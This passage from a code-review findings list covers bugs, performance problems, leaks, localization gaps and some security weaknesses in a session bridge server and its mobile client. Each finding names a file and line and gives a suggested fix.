  Unlike legacy SideChatFeatureHandler's per-client recordsByClient isolation, close_ephemeral_side_chat does no creator check and broadcastEphemeralSideChatRegistry sends the full registry to all clients. On multi-device setups one device closing a pane kills the other device's conversation and ownership is untraceable. Add ownerClientId with close-time validation and owner-scoped broadcasts.
- `S-4` **[bug]** `packages/bridge/src/file-mutation-auth.ts:336` — 密码失败计数以 WS 连接对象为键的 WeakMap，重连即清零绕过限速
  断开即清零 →"每 4 次尝试重连一次"完全绕过 5 次/30 秒限速；并行连接还能放大 scrypt(64MB maxmem) 的内存 DoS。应改为按对端地址的进程级 Map（带 TTL）+ scrypt 并发信号量。
- `3/C3` **[bug]** `packages/bridge/src/file-transfer-upload-store.ts:288` — pending with offset==sizeBytes is a dead state; finalize never re-triggered
  Reachable via 0-byte finalize transient failure, process kill between last-chunk persist and finalize's first upsertUpload(committing), or a non-EEXIST finalize error. No recovery path re-invokes finalize: any PATCH gets 413 (offset+len > sizeBytes always true, and len<1 also 413), status() only reconciles, resumeLocked returns ready; the client's while loop skips and waits 30s for upload_result forever, looping prepare/timeout, with the .part held until retention expiry.
- `4/C4` **[bug]** `packages/bridge/src/file-transfer-upload-store.ts:328` — Truncated/replaced partial makes cancel fail too; state and .part both leak
  cancel forces reconcilePendingEntry which throws 409 upload_partial_changed on inode change or current.size < entry.offset before removeUpload executes, so the transfer can neither resume nor be cancelled; the entry and orphan .part persist to retention expiry and can then hit finding 1's permanent stall. committing entries that recoverCommit cannot restore also cannot be cancelled (upload_state_invalid). Cancel should be best-effort.
- `5/C5` **[bug]** `packages/bridge/src/gallery-store.ts:218` — Gallery index/disk drift: saveIndex has no fsync, no reconciliation or orphan GC
  saveIndex uses writeFile+rename without handle.sync()/directory fsync (unlike state-store), so power loss can leave a truncated index.json that init() silently resets to [], losing the entire gallery index and orphaning all image files. init() also never verifies images/ files exist nor collects unreferenced orphans, and delete() unlinks before saving the index (crash resurrects entries whose serveImage 404s) while always returning true.
- `6/C6` **[bug]** `packages/bridge/src/gallery-store.ts:291` — addImage failure leaves meta in memory index while caller is told it failed
  meta is pushed to this.index before saveIndex; if saveIndex throws, the catch returns null so the HTTP caller gets 400 'Failed to add image', yet list() and serveImage still expose the entry until restart, after which it disappears and the copied file in images/ becomes an orphan. Save first (or roll back the push and delete the copied file).
- `14/D-14` **[perf]** `packages/bridge/src/git-operations.ts:739` — execFileSync git operations block the Bridge event loop; gitPull has no timeout
  gitFetch uses execFileSync with a 30s timeout pinning the Node main thread, and gitPull's execFileSync has no timeout at all so a credential prompt or hung network blocks indefinitely. During that time every WebSocket session, including running Claude/Codex sessions, stalls; gitStatus with includeRemote calls gitFetch and is triggered frequently by the session list.
- `S-7` **[bug]** `packages/bridge/src/index.ts:329` — Access-Control-Allow-Origin: * 无条件下发，/version 暴露 git commit 与分支名
  任意网页可跨源读取 /version，其中含 Node 版本、平台、git commit 与分支名，可用于指纹识别与版本针对性攻击。
- `B-4` **[bug]** `packages/bridge/src/local-features/subagents.ts:83` — Subagent concurrency gate is per-WebSocket-client, so panels of different sessions collide
  activeClients is a WeakSet keyed by client; two SubagentsControllers (two sessions, or panel + dock) on one phone each think they are idle, and one gets 'Another subagent request is already in progress', which _normalizedError passes through as raw English. Gate by client+sessionId or queue instead of rejecting.
- `9` **[bug]** `packages/bridge/src/parser.ts:1256` — String(msg.x) coercion in ~20 enum checks lets single-element arrays pass
  String(['plan']) === 'plan' so payloads like permissionMode:['plan'] or effort:['max'] pass validation but fail all downstream strict === comparisons, silently degrading to 'field not provided' (e.g. permissionMode falls back to default). set_permission_mode (1499-1506) does it correctly with typeof-first, confirming this is an oversight. Also core-report B9.
- `7` **[bug]** `packages/bridge/src/parser.ts:1408` — Legacy single-image fields imageBase64/imageId/skill unvalidated in input branch
  The check only requires mimeType to be a string when imageBase64 is truthy; a numeric imageBase64 passes and websocket.ts builds {base64:12345}, currently only saved by image-store's incidental try/catch. skill:5 passes and becomes codexSkills=[5] whose .name/.path read undefined. The plural images/skills/mentions arrays are element-validated, only the legacy singular forms are missed. Also core-report B7.
- `6` **[bug]** `packages/bridge/src/parser.ts:1669` — rename_session.name accepts any type with no length cap; persisted and broadcast
  Only sessionId is validated; websocket.ts:9192 coerces via (msg.name as string|null)||null so a truthy object passes straight through, is persisted, and appears in every session_list broadcast, violating the declared string|null protocol type. archive_session (2327-2339) caps name at 1024 chars, showing the inconsistency. A 10MB name would be persisted. Also core-report B6.
- `10` **[bug]** `packages/bridge/src/parser.ts:2099` — traceLimit/windowId numeric checks admit Infinity, negatives, and fractions
  Only typeof === 'number' is checked; JSON.parse('{"traceLimit":1e999}') yields Infinity which passes (verified). maxBudgetUsd correctly uses Number.isFinite and maxTurns Number.isInteger in the same file, so these two fields are inconsistent omissions. Also core-report B10.
- `8` **[bug]** `packages/bridge/src/parser.ts:2201` — git message files array elements unvalidated; git_unstage.files entirely unchecked
  git_stage only checks Array.isArray and git_unstage doesn't check files at all; non-string elements make execFileSync throw ERR_INVALID_ARG_TYPE (degraded to error response), and files:'abc' spreads into three single-character path args to 'git reset HEAD --', silently 'succeeding' with wrong semantics. hunks elements in the same branches are validated, so this is an inconsistent omission. Also core-report B8.
- `C-3` **[bug]** `packages/bridge/src/push-relay.ts:106` — App Check header never sent; verifyAppCheck always false, enforcement would 401 all
  PushRelayClient.post() sends only Content-Type and Authorization, never X-Firebase-AppCheck, so verifyAppCheck() constantly returns false and flipping ENFORCE_APP_CHECK=true would 401 every Bridge; meanwhile each request emits a warn log. Either wire up App Check in the Bridge or remove the dead branch to avoid a false sense of protection.
- **[test-gap]** `packages/bridge/src/sdk-process.test.ts` — sdk-process lifecycle and concurrency paths have zero test coverage
  sdk-process.test.ts covers only pure functions plus setPermissionMode/approveAlways/answer/input dispatch; start() in the test environment falls straight into the auth-failure branch (no ANTHROPIC_API_KEY), so items 1-8 (permission clearing, crash paths, restart races, reentry, queue reset) are entirely untested. Also asserted in core-report A13.
- `12` **[bug]** `packages/bridge/src/sdk-process.ts:118` — listAvailableClaudeModels: supportedModels() untimed, idle stream never settles, void drain
  websocket.ts:10670 awaits listAvailableClaudeModels directly; if the CLI never answers supportedModels() the call hangs forever (no timeout/AbortController). createIdleUserMessageStream awaits a never-settling promise, and finally's 'void drain;' neither awaits nor cancels the drain loop, which can keep running after the function returns.
- `10` **[leak]** `packages/bridge/src/sdk-process.ts:805` — stop() nulls userMessageResolve; user-message generator hangs on unsettled promise
  The generator at 1208-1213 awaits a promise whose resolver stop() discards, so the promise never settles: the generator frame, AsyncGenerator.return() completion, and the this-holding closure can never be released. Query.close() is synchronous so nothing blocks, hence P2 not P0.
- `11` **[bug]** `packages/bridge/src/sdk-process.ts:1113` — fetchSupportedCommands timer never cleared; stale result crosses into new session
  The 10s race timer is never clearTimeout'd or unref'd, holding its closure and keeping the event loop alive even when supportedCommands returns instantly; liveness is judged only by this.stopped, which start() resets to false, so a late result from the old query broadcasts supported_commands into the new session after restart.
- `13` **[logic]** `packages/bridge/src/sdk-process.ts:1298` — Loop exit unconditionally emits exit 0, even after stop() break or CLI crash
  After the for-await ends, the code always emits exit 0: an explicit stop() still gets an async duplicate exit 0 later, and a CLI that actually exited non-zero while the SDK iteration ended normally is reported as 0, so session.ts:1149's exit handler cannot distinguish normal end from crash.
- `14` **[bug]** `packages/bridge/src/sdk-process.ts:1313` — handleCanUseTool/waitForPermission lack stopped guard; revives waiting_approval after stop
  waitForPermission immediately emits permission_request and setStatus('waiting_approval') with no this.stopped check, so an in-flight can_use_tool control request arriving after stop() pulls status back from idle to waiting_approval and shows the client an approval dialog that can never be consumed (its pending is later discarded by clear).
- `9` **[leak]** `packages/bridge/src/sdk-process.ts:1363` — Permission abort listener never removed and gated by Map membership
  The once-listener stays attached to the request's AbortSignal after normal approve/reject, its closure retaining this and resolve; combined with items 1/2 (cleared-not-resolved pendings) the controller is never removed from the SDK's cancelControllers finally block, so these closures persist long-term. Fix: named handler removed on resolve, and drop the has() gate for idempotent resolve.
- `B-13` **[leak]** `packages/bridge/src/session-catalog-monitor.ts:242` — watchedDirectories 仅在 watcher error 事件中删除，fd 永久泄漏并计入 1024 上限
  macOS 上被删目录的 FSWatcher 往往只发 rename 不发 error，条目与底层 fd 永久保留。worktree 频繁创建/删除的工作流会单调逼近 cap，最终新目录装不上 watcher。
- `B-16` **[bug]** `packages/bridge/src/session-catalog-monitor.ts:250` — 无 degraded health 上报，watcher/readdir 失败全部静默
  grep degraded|health 在非测试文件零命中。watcher 失败静默 return（:250-252）、readdir 失败静默 continue（:197-201）、cap 命中无日志、sessions-index.json 解析失败仅 console.error。客户端无从得知 catalog 已退化，会把不完整结果当权威。
- `B-12` **[perf]** `packages/bridge/src/session-catalog-monitor.ts:301` — debounce 窗口内 keys 数 ≠ 1 即发 unscoped，触发全量 refreshCatalog
  两个会话同时活跃（手机 + 桌面各一个，很常见）时几乎每个 debounce 窗口都是 unscoped → 每 2.5 秒触发一次 B-2 的全量扫描。应让 change 携带带 cap 的 keys 列表，超出才 unscoped。
- `C8` **[perf]** `packages/bridge/src/session.ts:1739` — trimHistory uses Array.shift O(n) and fragile manually-synced dual arrays
  Each over-limit message triggers two O(n) shifts on history and historyEntries; the two arrays are kept in sync only by convention (push/shift in tandem) with no invariant assertion, so any missed site misaligns entry.message vs history[i]. Fix: single splice(0, overflow).
- `C9` **[bug]** `packages/bridge/src/session.ts:1922` — steerCodexQueuedInput unconditionally appends history after await; duplicate message
  After await steerTurnStructured, the 1987-1990 appendHistoryToSession/onMessage run even when the user edited the queued item during the await (the 1981 comparison only gates queue clearing). History then shows a 'sent' user message while the edited version still sits in the queue — visible message duplication.
- `C6` **[bug]** `packages/bridge/src/session.ts:2143` — rewindConversation destroys old session before create(); create failure loses session
  destroy(id) runs first; create() then performs createWorktree, execFileSync('git'), and proc.start(), any of which can throw, leaving the user with no session at all (old destroyed, new not built). The new id also differs from the old, forcing clients to rebuild all sessionId-keyed local state.
- `C7` **[bug]** `packages/bridge/src/session.ts:2380` — evictStaleIdleSessions silently destroys sessions the user is actively viewing
  Triggered on every status->idle and every exit; beyond MAX_IDLE_SESSIONS=30 it destroys oldest-by-lastActivityAt idle sessions with no check for active client subscriptions and no dedicated eviction notification (onSessionUpdated only carries the last destroyed id).
- `B-15` **[logic]** `packages/bridge/src/sessions-index.ts:28` — 会话 identity 无 codexHomeId 维度，双 CODEX_HOME 下互相碰撞
  SessionIndexEntry 无 home 字段，archived key 为 provider\0sessionId，39022937/6685185e 引入的 durable key 同样只有两维。双 CODEX_HOME 场景下同 threadId 不同内容互相碰撞并覆盖 revision。
- `B-14` **[logic]** `packages/bridge/src/sessions-index.ts:1127` — getAllRecentSessions 用不带 provider 前缀的 raw sessionId 去重
  `seen.get(entry.sessionId)` 对 [...claudeEntries, ...codexEntries] 去重，跨 provider uuid 碰撞时按"字段丰富度打分"丢掉一条会话。而 websocket.ts:1114-1123 的 recentSessionDedupeKey 已是 provider:sessionId，两处口径不一致。
- `B-8` **[perf]** `packages/bridge/src/sessions-index.ts:2023` — getCodexSessionIndexMetadata 全树遍历 + O(files × wanted) endsWith 匹配
  对每个文件遍历 wantedThreadIds 做 endsWith。已存在的优化入口 getCodexSessionIndexMetadataForFiles（注释明确说 thread/list 调用方应改用它）并未被使用，websocket.ts:10922 仍调旧版。
- `N-4` **[l10n]** `packages/bridge/src/websocket.ts:1251` — tokenLocales 是内存 Map，Bridge 重启后 zh/ja/ko 用户收不到任何通知
  重启后 getRegisteredLocales() 返回 ["en"]，而 functions/src/index.ts:394-398 的 `if (tokenLocale !== body.locale) return false` 直接过滤掉非 en 的推送目标。locale 需随 token 持久化。
- `S-5` **[perf]** `packages/bridge/src/websocket.ts:1393` — WS 无消息大小限制、无速率限制、无并发连接上限
  ws 默认 maxPayload 100 MiB，单条 100 MiB 消息经 toString() + JSON.parse 即约 300 MB 瞬时占用。无令牌桶与连接数上限，单个客户端即可 OOM 掉 Bridge。
- `A-6` **[logic]** `packages/bridge/src/websocket.ts:2193` — Persisted side-chat dead code remains wired into runtime with no limits or auxiliary guard
  createPersistedCodexChildSession does a non-ephemeral fork with no 8/4 cap and no parent.auxiliary guard (unlike the ephemeral version) and is attached to the runtime at websocket.ts:1447; only the handler registration is missing, so one added line yields an unguarded session factory. Violates the handoff rule against new persistent session types; Mobile's unreferenced persisted_side_chat_pane.dart (246 lines) matches. Delete the whole persisted-side-chat chain or add matching guards.
- `S-6` **[leak]** `packages/bridge/src/websocket.ts:4822` — push_register token 无格式/数量上限且不随连接断开清理
  token 只校验 typeof === "string"，无长度/格式/数量上限，写入 4 个进程级 Map 且断开时不清理 → 内存单调增长，同时可被用来污染推送目标集合。
- `A6` **[bug]** `packages/bridge/src/websocket.ts:7137` — Resume reverse-maps executionMode:'default' to approvalPolicy 'on-request'
  requestedApprovalPolicy derives 'on-request' from any non-fullAccess executionMode, taking priority over savedApprovalPolicy (websocket.ts:7325-7327). Old Mobile clients or _resumeSessionWithParams passing executionMode:'default' unconditionally downgrade real on-failure/untrusted policies. executionMode should only influence the 'never' branch and otherwise return undefined.
- `R-6` **[bug]** `packages/bridge/src/websocket.ts:7627` — Gallery 在所有层都没有归属模型
  list_gallery 分支没有 isPathAllowed(msg.project) 也无客户端归属校验，msg.project 可省略，省略时 galleryStore.list({}) 返回全部项目的全部图片；新图片经 broadcast 推给所有已连接客户端。与 SEC-3、S-1 构成同一缺口的三个面，应整体修复。
- `S-2` **[bug]** `packages/bridge/src/websocket.ts:8283` — remove_worktree 对客户端提供的 worktreePath 无任何校验
  只校验 projectPath，worktreePath 直接作为 hook 的 cwd 并传给 `git worktree remove --force`。客户端可指定任意路径触发删除与 hook 执行。
- `S-3` **[bug]** `packages/bridge/src/websocket.ts:10111` — list_recent_sessions/get_history/resume_session 完全不经 BRIDGE_ALLOWED_DIRS 过滤
  直接扫 ~/.claude/projects 与 ~/.codex/sessions（sessions-index.ts:960,1218,1271,1692）。即使白名单收紧到单个目录，仍可列出所有项目路径并读完整对话历史（含粘贴过的密钥、内网地址）。
- `B-7` **[perf]** `packages/bridge/src/websocket.ts:10134` — all-provider 路径重复全扫 Codex rollout，结果被 merge 整体丢弃
  并行执行 getAllRecentSessions（未传 provider → 完整解析所有 Codex rollout）与 listRecentCodexSessions（thread/list），mergeRecentSessionPages 按 provider:sessionId 保留首个 → 扫描侧对全部 Codex rollout 的 head+tail 解析结果全部白费。
- `B-3` **[logic]** `packages/bridge/src/websocket.ts:10976` — isPrivacyMode is a bridge-wide OR across all registered tokens
  If any one token enables privacy, every device's pushes are degraded to privacy text; combined with C-2 (dead tokens never cleaned), an uninstalled privacy-enabled device permanently pollutes the global policy.
- `A-4` **[bug]** `packages/bridge/src/websocket.ts:11171` — FCM result path writes subtype/stopReason without the privacy gate
  The FCM notification builder duplicates the background-projector logic but omits its if (!privacy) guard, so privacy-mode users still get subtype and stopReason in push payload data. The FCM path should be refactored to reuse projectBackgroundNotification to eliminate the second implementation.
- `C-4` **[bug]** `packages/bridge/src/websocket.ts:11206` — Default non-privacy push leaks reply/error text, question, and project dir
  With privacyMode defaulting to false, push payloads carry msg.result.slice(0,120) (assistant reply), msg.error.slice(0,120) (often paths/stacks), questionText, toolName/toolUseId, and a title with session plus project directory name, all plaintext through FCM/APNs (visible to Google/Apple) and on the lock screen. Consider defaulting privacyMode to true or an explicit opt-in disclosure.
- `8/D-8` **[bug]** `packages/bridge/src/websocket.ts:11669` — Async git diff between intent-to-add and reset un-stages files user staged concurrently
  Unstaged mode runs git add --intent-to-add synchronously, then an async execFile diff, and only in the callback execFileSync git reset on the untracked files; a Stage All landing during the diff window gets reverted by the later reset. Bridge has no git serialization — everything else is execFileSync 'accidentally' serial, and only this async diff path opens the race.
- `15/D-15` **[perf]** `packages/bridge/src/websocket.ts:11873` — Entire image blobs read into memory just to compute sizes, with no pre-read cap
  collectImageChanges reads full old blobs via git show and readFile(absPath) with no size check just to use .length, so a 200MB .bmp fills memory before the MAX_IMAGE_SIZE check runs. Should use git cat-file -s and fs.stat instead. The missing .catch on collectImageChanges().then() at line 8194 was already fixed this session (P0-2/D-15); the memory issue remains.
- `R-4.2` **[bug]** `packages/bridge/src/websocket.ts:12082` — 调试轨迹记录未脱敏的用户提示词与 tool_result 内容
  summarizeClientMessage 的 case "input" 记录每条提示词前 80 字符；summarizeServerMessage(:12111-12147) 记录 assistant 正文前 100 字符、tool_result 内容前 100 字符（Agent 读 .env 或 cat 私钥时前 100 字符即落盘）、error 原文。同一函数里 push_register token 被正确截断为 8 字符，说明这是疏漏而非设计。

### Mobile

- `D6` **[test-gap]** `apps/mobile/analysis_options.yaml` — No strict-casts/strict-raw-types/strict-inference or avoid_dynamic_calls enabled
  Implicit dynamic conversions are allowed, which directly prevented the E3 dynamicArgs.sessionId defect from being caught, and unawaited_futures is off despite heavy unawaited() use. Enable strict-casts and avoid_dynamic_calls alongside D2's --fatal-infos.
- `A5` **[l10n]** `apps/mobile/l10n.yaml:3` — Fallback locale inconsistent: ARB falls back to Japanese, ad-hoc tables to English
  template-arb-file app_ja.arb with preferred-supported-locales ja makes unsupported locales fall back to Japanese, while all 17 ad-hoc tables default to _en. A fr/de/es device shows Japanese ARB copy and English ad-hoc copy on the same screen; unify the fallback semantics.
- `A9` **[bug]** `apps/mobile/lib/features/artifact_preview/artifact_preview_screen.dart:172` — iOS isForMainFrame always true; WebContent process kill treated as fatal failure
  The WKWebView delegate hardcodes isForMainFrame:true in all three failure callbacks, making the sub-frame URL-comparison fallback branch dead code. webViewWebContentProcessDidTerminate (common with large HTML) shows the full-screen artifactOpenFailed error instead of reloading.
- `D7` **[perf]** `apps/mobile/lib/features/artifact_preview/artifact_preview_screen.dart:276` — Download onProgress calls setState on every network chunk with no throttling
  The progress callback invokes setState per received chunk, producing thousands of setState calls per second during a 64MiB download and needless full rebuilds of the screen.
- `A11` **[logic]** `apps/mobile/lib/features/artifact_preview/artifact_preview_screen.dart:514` — After user dismisses Quick Look, screen shows blank card that reads as failure
  previewControllerDidDismiss returns normally, leaving only a file icon, filename, and a Preview button on screen. Users interpret this residual state as an open failure; no auto-pop or explicit dismissed state is rendered.
- `A6` **[perf]** `apps/mobile/lib/features/artifact_preview/artifact_quick_look_service.dart:117` — Full file (<=64MiB) downloaded before canPreview check; double download on fallback
  previewTemporaryArtifact does prepareFile() (full HTTP download) before _gateway.previewFile() where canPreview is first evaluated. On Android/macOS (MissingPluginException) and iOS unsupported text types, the file is downloaded, deleted, then re-downloaded by the WebView fallback.
- `B-2` **[bug]** `apps/mobile/lib/features/background_sync/background_notification_mode_controller.dart:560` — Fail-private on disconnect is never restored on reconnect
  On BridgeConnectionState.disconnected the controller sets _privacyMode = true but there is no connected branch restoring the real setting; only a manual settings change via updatePolicy() resets it, so one network blip permanently degrades notification text to the privacy variant.
- `B-4` **[bug]** `apps/mobile/lib/features/background_sync/background_sync_coordinator.dart:545` — BGAppRefresh queued behind _syncTail; 25s budget eaten by prior lifecycle sync
  _synchronize appends to the global _syncTail queue, so if the enteringBackground sync is still running the BGAppRefresh task's 25-second budget is consumed waiting; when its turn arrives _isCancelled makes it return false and the refresh opportunity is wasted. BGAppRefresh should preempt (cancel) queued lifecycle syncs.
- `B7` **[bug]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:794` — External Desktop idle events unconditionally wipe the approval card
  _finishExternalDesktopTurn (794-802) and the snapshot idle branch (1592-1600) both set ApprovalState.none() without a follow-up _restoreRuntimeInteractions, relying on an async requestSessionHistory. With phone and Desktop on the same thread, a Desktop idle event can erase a live plan approval with a 900ms-to-seconds gap or lose it entirely.
- `B6` **[bug]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:1180` — _restoreRuntimeInteractions gated to Codex only; Claude ExitPlanMode not restored after leaving screen
  `if (!isCodex || isClosed) return;` prevents restoration for Claude sessions even though Bridge exposes getPendingPermission for SdkProcess too (session.ts:1348-1361). Claude plan approvals disappear from the UI after navigating away and back. Remove the provider restriction or document the gap.
- `B8` **[bug]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:4064` — approve/reject is optimistic local-terminal with no Bridge ack or replay recovery
  _markToolUseResponded runs before send; if Bridge restarted, the replayed approve hits a nonexistent toolUseId (codex-process.ts:2177-2183 logs only) while Mobile has permanently marked it responded so _restoreRuntimeInteractions skips it — the approval vanishes while the agent still waits. Introduce a requestId + Bridge ack (reuse the permissionChangeId pattern) and only mark responded after ack.
- `B5` **[bug]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:4153` — Mobile still clears pending approvals when last status != waiting_approval
  The gate v01 removed from Bridge still exists on Mobile: history processing clears _pendingPermissionRequests unless the last status is waitingApproval, relying on _restoreRuntimeInteractions to rescue. When the _bridge.sessions snapshot is stale (see B4) the rescue fails and _emitNextApprovalOrNone finds nothing. Runtime ledger should be authoritative; history should supplement, not clear.
- `A7` **[logic]** `apps/mobile/lib/features/chat_session/state/chat_session_cubit.dart:4325` — Codex sessions persist permission settings to SharedPreferences that are never read
  _SessionSettingsHelper.save writes permissionMode/executionMode for Codex thread ids (lines 4325-4340, 4548-4556) but session_resume_coordinator.dart:206-212 only loads for !isCodex. Harmless today, but any future wiring of the read path would instantly reintroduce the v01 default-value pollution. Either stop writing for Codex or exclude unknown values.
- `D-7` **[perf]** `apps/mobile/lib/features/chat_session/widgets/chat_input_with_overlays.dart:817` — readAsBytes loop loads up to 5 full images into memory at once
  await file.readAsBytes() in a loop reads up to five picked images fully into memory on the main flow, in contrast to the streaming file-transfer pipeline used elsewhere.
- `3.4-1` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:711` — live/persisted 双 surface 未合并，thinking 到达时已展开的过程明细"蒸发"
  persisted viewport key 为 process_details_viewport_current_$progressKey(:711)，live 为 live_process_details_viewport_$progressKey(:911-913)，且挂在不同的 ListView item。thinking delta 置 isStreaming=true 而 isCurrentSegmentEntry 要求 !hasStreaming(:1041-1044) → persisted 框整体消失、live 框在别处重建，live 展开态只渲染 tool line + live thinking(:917-944) 不含 _buildProcessSegmentDetails，每次切换丢失内部滚动位置并重建 State。
- `U-1` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:909` — 展开态可出现空的带边框八行框
  live 分支 expanded=true 且 thinking 为空时 children 只剩返回 SizedBox.shrink 的 BlocSelector，仍渲染出只有边框加上下 padding 的空盒；persisted 分支渲染 viewport 前未检查 segment.detailCount > 0，_expandedCurrentProgress 含 stale key 时同样出空框。
- `3.4-2` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_message_list.dart:1200` — surface 切换导致 _ProcessDetailsViewportState 重建，Guardian 3 秒通知重复出现
  _ProcessDetailsViewportState 持有 _guardianTimer，3.4-1 的 key 变化使 State 重建 → initState → _syncGuardianReview 把 _showGuardian 重新置 true → 同一 review 的 3 秒通知重复出现、总时长超约。应把计时提到不随 surface 重建的层。
- `3.1-6` **[bug]** `apps/mobile/lib/features/chat_session/widgets/chat_process_disclosure.dart:328` — ChatCurrentToolActivityLine 的 displayName 无 Flexible/ellipsis → RenderFlex 溢出
  行内固定宽度 = icon(12) + 状态词(≈44px) + displayName(不限宽) + timestamp(≈50px，341b2a26 新增) + chevron(15)。getToolDisplayName 对未知名兜底原样透出（tool_categories.dart:218），MCP 长名如 mcp__chrome-devtools__take_screenshot 在窄屏（320/280pt）中文场景必然溢出，时间戳/箭头被顶出。同文件 :63-73 与 :145-172 已有 Flexible/Expanded 模式，只是新增行漏了。
- `H-5` **[perf]** `apps/mobile/lib/features/claude_session/claude_session_screen.dart:202` — 非 pending 会话每次 patch commit 做一次"读库 + 全量解码 + 丢弃"的空转
  _startDurablePreview 无条件订阅 sync.updates 并 load，完成后因 !_isPending 直接 return（:241-244），结果被扔掉。流式输出时每个增量提交触发一次 sqlite 读 + 最多 2000 条 JSON decode。
- `H-14` **[perf]** `apps/mobile/lib/features/claude_session/claude_session_screen.dart:493` — preview→绑定成功时 key 从 durable-* 切到 ValueKey(_sessionId)，整棵子树重建
  即使修复 H-1，绑定成功瞬间 key 仍会变化，整个 provider 子树销毁重建，预览期的展开/滚动状态丢失。需把 durable screen identity 与 runtime ID 解耦。
- `H-4` **[perf]** `apps/mobile/lib/features/claude_session/claude_session_screen.dart:495` — 预览子树 key 含 cachedPreview.revision，每次增量 commit 整树销毁重建
  key 含 revision 使每次 Bridge 增量 commit 都销毁全部 cubit/列表/滚动位置并重建，且 initialHistoryMessages 对最多 2000 条 entry 在主线程逐条 decodeMessage()（:503-505）。高频 patch 下预览页持续跳动加卡顿。codex_session_screen.dart:539 同。
- `D-2` **[bug]** `apps/mobile/lib/features/claude_session/claude_session_screen.dart:1665` — Fixed local notification IDs (1/2/3) collide across concurrent sessions
  Approval=1, question=2, complete=3 are constants, so with multiple sessions a later session's approval notification overwrites an earlier one and the first approval entry is lost; the FCM/background-projection path uses (sessionId, provider, eventType) hashes, so the two ID spaces also produce duplicate entries. Same defect in codex_session_screen.dart:2141,2158,2172.
- `C-3` **[bug]** `apps/mobile/lib/features/codex_session/codex_session_screen.dart:1907` — Side-chat pane renders nested floating dock; nested fork rejected with misleading error
  Public CodexSessionScreen has no detachedPreview parameter, so the child screen inside the side-chat pane renders another AuxiliaryFloatingDock; attempting a side chat from that dock is rejected by websocket.ts:2299's parent.auxiliary guard with 'The parent Codex session is no longer active', which misstates the cause. Expose hideAuxiliaryDock for auxiliary usage and return a dedicated nested_side_chat_unsupported error.
- `H-6` **[bug]** `apps/mobile/lib/features/conversation_content_sync/conversation_content_sync_service.dart:534` — _restartSubscription 无退避，坏快照导致无限紧凑重订阅循环
  快照校验失败或 entries.length > maxHotWindowEntries(2000) 抛 StateError → 立即 unsubscribe + 立即 resubscribe → Bridge 再推同一坏快照，每轮传输整个热窗口。_scheduleRetry 的 2 秒 timer 不覆盖 restart 路径。
- `9/E-6` **[bug]** `apps/mobile/lib/features/explore/explore_screen.dart:140` — _ensureHighlightedVisible re-registers scroll every build using previous-frame context
  Called from the BlocBuilder on every rebuild, it captures _highlightedEntryKey.currentContext from the prior frame and schedules Scrollable.ensureVisible in a post-frame callback without re-checking mounted-ness of that context. Since _highlightedFilePath is never cleared after peek, every rebuild replays a 220ms scroll (list visibly yanked back), and a deactivated element throws.
- `A4` **[l10n]** `apps/mobile/lib/features/explore/explore_screen.dart:182` — explore feature has zero localization (0/8 files); git feature only 4/28
  explore is entirely hardcoded English ('Explorer', 'No recent open files yet'), and git has only 4 of 28 files using AppLocalizations ('Cancel'/'Revert'/'New Branch'/'Commit & Push'/'Tap to load preview' etc. hardcoded). These button labels are UI copy, not command text, and should be localized.
- `11` **[perf]** `apps/mobile/lib/features/explore/explore_screen.dart:218` — No pagination/load-more; archive uses eager ListView; truncation hides whole directories
  Both truncation notices are read-only with no load-more or offset/limit protocol, and the archive screen builds all tiles in a bare ListView(children:[...]) so thousand-entry lists instantiate every tile at once. Explorer's truncation applies to the whole-repo file list from which the tree is derived, so deep directories can vanish entirely while the banner cannot express that.
- `10/E-7` **[bug]** `apps/mobile/lib/features/explore/state/explore_cubit.dart:14` — Neither Explorer nor archive list recovers automatically after reconnect
  ExploreCubit has no connectionStatus subscription and requests the file list only in its constructor, so after the disconnect empty-list reset it stays empty until manually reopened. SessionArchiveCubit subscribes but its connected branch does nothing, so the list stays stale after reconnection, especially after item 3's false failure left deleted sessions visible.
- `B5` **[logic]** `apps/mobile/lib/features/file_peek/file_peek_sheet.dart:73` — Three divergent path-resolution implementations with different semantics
  _resolveFilePath (suffix match over projectFiles with a multi-candidate picker), classifyMarkdownLink (Windows paths/file: scheme/line-col stripping), and resolveFileBrowserPreviewUri (origin validation) plus Bridge normalizeRelativePath all behave differently. The same path string can resolve differently depending on the entry point.
- `C-12/C23` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:630` — continuePaused rebuilds work object, dropping cancelRequest/cancelled state
  Resume constructs a fresh _ReceiveWork from the checkpoint, losing the old object's cancelRequest and cancelled flags. If the user cancels (accepted bridge-side) then taps continue, the client restarts the download and later fails with 404; continuePaused should short-circuit when cancellation is pending.
- `C-7/C18` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:924` — Expired completion-recovery work dropped without ACK or knownReceiveIds purge
  When _drain pops an expired completion-recovery candidate it silently discards it: no _sendReceiveResult, no _knownReceiveIds.remove, no deleteReceive. A re-sent offer with the same transferId is then swallowed by the _handleOffer dedup check at :763, so the Mac hangs waiting for the ACK forever.
- `C-13/C24` **[perf]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:930` — Single-flight drain with strict priority starves uploads under receive load
  _drain processes in fixed order completionRecovery > receiveQueue > uploadRecoveryQueue with single concurrency; if the Mac keeps pushing files the receive queue never empties and user-initiated uploads are indefinitely postponed. Needs quotas or fair rotation by enqueue time.
- `C-9/C20` **[bug]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:1727` — Renewed download lease discarded; retries reuse old secret and URL
  On leaseExpired the code awaits _renewDownloadLease but drops the refreshed secret, so the next loop iteration re-sends with the outer stale secret and URL. This currently works by luck (constant downloadToken, URL rebuilt from same base); after an origin change (Tailscale/LAN/SSH switch, which the code comments acknowledge) retries keep hitting the old origin until the 3 attempts exhaust.
- `C-8/C19` **[logic]** `apps/mobile/lib/features/file_transfer/file_transfer_service.dart:2340` — After 5 ACK retries the checkpoint is skipped forever and orphaned
  Once _completionRecoveryAttempts reaches completionRecoveryRetryLimit, _recover permanently skips the commit-complete checkpoint; only a capability none-to-available transition or the 7-day expiry unlocks it, and the pending local notification never fires. Retry count is in-memory only and never reset per connection epoch.
